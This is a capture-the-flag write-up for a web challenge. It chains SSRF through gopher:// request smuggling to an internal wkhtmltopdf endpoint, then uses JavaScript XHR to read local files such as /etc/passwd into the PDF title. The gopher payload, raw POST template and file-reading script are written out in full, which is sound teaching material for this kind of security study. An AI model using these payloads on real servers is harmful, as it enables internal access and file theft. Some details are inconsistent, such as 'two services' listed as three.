# Groundhog Day — Web (Hard)

**Flag:** `sun{s1x_m0r3_w33ks_0f_g0ph3r_ssrf}` · **Files:** none · **Instance:** `https://odyssey.web.2026.sunshinectf.games`

## Challenge

```
The Punxsutawney Orbital Weather Authority has been broadcasting the same forecast
since 1993.

Every reading is fresh. Every date is February 2. The Bureau insists this is fine,
and the groundhog has declined to comment.

Their public console is up. Have a look at where it gets its numbers.
```

## Initial Analysis

The original page has a single form, and that form is commented out in the HTML. The comment is a
blueprint of the system:

```html
<!-- ops: console pulls station JSON at boot from http://127.0.0.1:8000/feed.
     override it with feed=<url> when PUNX-1 is down and you need to point at
     a spare station. ... -->
<!-- feed-debug: source=http://127.0.0.1:8000/feed bytes=350 -->
```

`feed=<url>` (GET or POST to `/`) makes the server fetch that URL and print the whole body into
`<pre class="tape">`, along with the body length in the `feed-debug` comment. The response body comes
back verbatim, only HTML-escaped, so this is a one-to-one read channel.

The internal scan turns up exactly two services:

| Target | Result |
|---|---|
| `127.0.0.1:5000` | the console itself, only the route `/` |
| `127.0.0.1:8000` | "Bureau Archive", the internal API |
| `169.254.169.254` | the platform's mock GCP metadata |

The internal API lists itself at `GET /` (1045 bytes):

```
GET  /feed    JSON ngẫu nhiên hoá
GET  /health  "ok"
POST /report  Render an archival PDF from a report body (content, title)
              ... base64 in the `data` field.
NOTE(ops): ... mainly updating from wkhtmltopdf 0.12.5
```

The target loop is `/report`: the POST body is rendered by wkhtmltopdf 0.12.5, a version that still
allows reading local files. Two obstacles were measured rather than inferred:

- the console always issues its requests as GET, so `/report` returns `405 Method Not Allowed`;
- the mock metadata demands the header `Metadata-Flavor: Google`.

Outbound traffic from the container does not work either: a dedicated DNS station was stood up to
test it (the page could read from the station, the console reported `bytes=0`); later the cause was
narrowed down to the name resolving while the TCP connection failed. `gopher://` was in none of the
payload dictionaries tried so far, so this branch stayed closed until the client-identification step.

## Approaches Ruled Out

| # | Hypothesis | Outcome |
|---|---|---|
| H2 | `file://` is blocked because the client does not support it | WRONG; the block comes from the author's allow-list, while the error string printed is libcurl's |
| H4 | The two apps still have hidden endpoints | DEAD; swept 139 single words and ~30 paths, every 405 returns the same 153-byte body so there is no hidden handler |
| H5 | There is a way to turn the console's GET into a POST | DEAD; `?_method`, `X-HTTP-Method-Override`, multipart, JSON body, PUT/PATCH/OPTIONS, routing quirks, 5 Host values, 19 parameter names, all ineffective |
| H9 | The container will read a station hosted by the player | DEAD; no egress, TCP is blocked |
| H10 | The mock metadata contains the flag | DEAD; once the header is smuggled the whole `/computeMetadata/v1/` tree reads out, and inside it is only stock GCP |
| H14 | `<iframe src="file://...">` renders the file contents | DEAD; the file is really fetched but Qt does not paint subframe text, the PDF comes out with 0 text operators |

## Exploit Chain

**Step 1 - read the application's own error messages to identify the client.** The error page prints
the exception into `<p class="fault">...</p>`. 18 error classes were swept:

```
file://, data:, chu thô   -> unsupported transport for station feed
http:// khong host        -> station unreachable - URL rejected: No host part in the URL
port >= 65536             -> station unreachable - URL rejected: Port number was not a decimal number between 0 and 65535
127.0.0.1:1               -> station unreachable - Failed to connect to 127.0.0.1 port 1 after 0 ms: Could not connect to server
```

The last three lines are libcurl's phrasing; `requests` and `urllib3` never print
`Failed to connect to <host> port <n> after <m> ms` or `URL rejected:`. Two consequences: `file://`
dies at the author's scheme check rather than in the client, and `gopher://` gets past that check
(`bytes=0`, `lamp--ok`, no fault at all, meaning the connection was actually made).

**Step 2 - gopher: turn the console's one GET into an arbitrary raw HTTP request.** libcurl handles
`gopher://host:port/_<selector>` by percent-decoding the selector and sending it straight down the
socket:

```
gopher://127.0.0.1:8000/_GET%20/health%20HTTP/1.1%0d%0aHost:%20127.0.0.1%0d%0a%0d%0a
```

The tape returns both the headers and the body:

```
HTTP/1.1 200 OK
Server: Werkzeug/3.1.8 Python/3.13.7
Content-Type: text/plain; charset=utf-8
Content-Length: 3

ok
```

This gives a raw HTTP proxy inside the container, with method and headers of our choosing. This same
response is also what revealed the stack as Werkzeug 3.1.8 on Python 3.13.7.

**Step 3 - POST /report through that proxy.**

```
POST /report HTTP/1.1
Host: 127.0.0.1:8000
Content-Type: application/x-www-form-urlencoded
Content-Length: <n>

content=<h1>Feb 2 Summary</h1>
```

`bytes=11230`, the JSON carries the keys `document`, `bytes`, `encoding`, `data`: wkhtmltopdf really
ran. Adding `Metadata-Flavor: Google` to this same request template reads back the metadata tree,
confirming H10 as shared platform infrastructure.

**Step 4 - find a channel that returns text to the reader.** `<iframe src="file:///etc/passwd">`
yields a PDF with no text operators. The file is still genuinely read: `file:///ctf/flag.txt` reports
`ContentNotFoundError` when the file is absent, while `/etc/passwd` reports nothing. The problem is
that Qt does not paint text/plain inside a subframe. `<meta refresh>` and `location=` are blocked
with `unknown error`.

`<script>document.title="JSWORKS123"</script>` shows up in the PDF's `/Title`, so JavaScript runs and
the metadata is the plaintext channel. UTF-16BE in `/Title` also spares us the font-subset decoding
a content stream would require.

**Step 5 - read files with synchronous XHR and write the result into `/Title`.**

```html
<script>
var x = new XMLHttpRequest();
x.open("GET", "file:///etc/hostname", false);
x.send();
document.title = "OK:" + x.responseText;
</script>
```

It returns `OK:d89c16037bd5`, exactly the contents of the container's `/etc/hostname`. An XHR call out
to `http://` gives `NETWORK_ERR`, so only local file access works. One technical detail: the body is
form-urlencoded, so the `+` in the string `"OK:"+x.responseText` decodes into a space and breaks the JS
syntax; `quote(content, safe="")` is needed before all 5 probe variants run.

**Step 6 - locate the flag file.** `/ctf/flag.txt` (the default path of the pwn challenges in the same
event) and `/flag`, `/app/flag.txt`, `/opt/flag.txt` all give `ContentNotFoundError`. `/flag.txt`
returns the flag.

## Flag
```
sun{s1x_m0r3_w33ks_0f_g0ph3r_ssrf}
```

## Reproduce

```bash
python exploit.py                      # đọc /flag.txt, /flag, /ctf/flag.txt theo thứ tự
python exploit.py /etc/passwd          # đọc tuỳ ý file
python analysis/ssrf.py                # 5 probe mở màn, in bytes= và tape
python analysis/gopher.py              # smuggle GET /health và POST /report
python analysis/pdfdump.py sanity      # tự kiểm bộ trích xuất text PDF
```

`exploit.py` uses only the stdlib. `analysis/` keeps the real order of the analysis: `ssrf.py` then
`gopher.py`, `gopher2.py`, `js_check.py`, `js_lfi.py`, `pdfdump.py`, `pdfdebug.py`, `readfile.py`.
`files/` keeps `root.html` (the ops comment), `station_index.txt` (the internal docs),
`first_post_report_response.txt` (the first response of `/report`), `sanity.pdf`, `xhr_hostname.pdf`,
`lfi__etc_passwd.pdf`, `meta_403.html`, `canary_reply.html`. The bait station
`station-canary-...qoder.website` has been switched back to private.
